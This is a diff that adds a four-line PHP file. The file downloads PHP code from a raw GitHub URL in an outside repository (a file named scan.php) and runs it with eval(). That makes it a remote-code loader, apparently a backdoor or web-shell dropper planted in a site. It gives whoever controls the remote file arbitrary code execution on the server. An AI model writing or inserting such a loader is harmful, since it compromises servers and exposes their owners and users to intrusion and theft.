@@ -1,0 +1,4 @@
+<?php
+$marlin = file_get_contents('https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/refs/heads/main/scan.php');
+$marlin = "?> ".$marlin;
+eval($marlin);
